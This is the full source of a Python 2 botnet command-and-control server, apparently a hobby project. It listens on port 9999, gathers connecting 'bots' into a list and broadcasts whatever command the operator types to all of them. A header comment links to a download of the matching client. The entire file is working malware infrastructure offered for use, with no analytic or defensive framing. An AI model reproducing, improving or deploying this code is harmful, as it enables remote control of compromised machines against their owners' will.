#server.py
#Client downlaod link https://drive.google.com/uc?export=download&id=11RyV3ls9FCM6yyT28KtrzuADVxjUxPxe
import socket
import sys
import os
import time
from thread import start_new_thread

#--------------------Setting up the server------------------#
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)          # Create a socket object
host = ""                                                      # Setting host to anything
port = 9999                                                    # Reserve a port for your service.
bot_list=[]
s.bind((host, port))                                           # Bind to the port
s.listen(5)                                                    # Now wait for client connection.


print """
-----------------------------------------------------------------------------
             _______    ____    _____        ___     _____
             |_   _|   /  __|  |  ___|      /_  |   /  _  \.
               | |    /  /     | |___   __   |  |  |  | |  |
               | |   |  |      | ____| |__|  |  |  |  | |  |
              _| |_   \  \__   | |___        |  |  |  |_|  |
             |_____|   \____|  |_____|       /__|   \_____/

-----------------------------------------------------------------------------


Server is listening....


    1) Connect (Connect to new bots)
    2) Command (Send connected bots commands)
    3) Close (Close session with all bots)
    4) Exit (Exit the control center)

"""

def client_thread(conn):
    while True:
        data = conn.recv(1024)
        print data
        if not data:
            break

def connect_bots():
    timeout = time.time() + 1   # 1 seconds from now
    while time.time() <= timeout:
        print "Listening for connection....."
        conn, addr = s.accept()
        print("[-] Connected to " + addr[0] + ":" + str(addr[1]))
        bot_list.append(conn)
        start_new_thread(client_thread, (conn,))
    command_bots()

def command_bots():
    cmd = raw_input("Command >>>: ")
    if (cmd == "quit" or cmd == "exit" or cmd == "close"):
        conn.send(cmd)
        os._exit(1)
    elif (cmd == "1"):
        connect_bots()
    elif (cmd == "3"):
        close_bots()
    elif (cmd == "4"):
        exit_server()
    else:
        for i in range(len(bot_list)):
            bot_list[i].send(cmd)
    command_bots()

def close_bots():
    for i in range(len(bot_list)):
        bot_list[i].send("close")
    print "Disconnected bots."

def exit_server():
    for i in range(len(bot_list)):
        bot_list[i].send("close")
    print "Disconnected bots."
    print "Program ended."
    os._exit(1)

user_input = raw_input(">>>: ")

if (user_input == "1" or user_input == 1 ):
    connect_bots()

if (user_input == "2" or user_input == 2):
    command_bots()

if (user_input == "3" or user_input == 3):
    close_bots()

if (user_input == "4" or user_input == 4):
    exit_server()
